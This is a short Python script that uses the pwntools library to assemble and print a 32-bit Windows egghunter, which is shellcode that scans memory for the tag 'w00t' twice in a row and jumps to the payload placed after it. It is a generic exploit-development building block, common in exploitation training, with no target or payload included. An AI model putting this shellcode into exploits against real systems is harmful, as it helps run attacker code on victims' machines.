#!/usr/bin/env python3

from pwn import *

egghunter = asm('''
loop_inc_page:
    or dx, 0x0fff
loop_inc_one:
    inc edx
    push edx
    xor eax, eax
    inc eax
    inc eax
    int 0x2e
    cmp al, 0x5
    pop edx
    je loop_inc_page
    mov eax, 0x74303077
    mov edi, edx
    scasd
    jnz loop_inc_one
    scasd
    jnz loop_inc_one
    jmp edi
''')

print(egghunter)

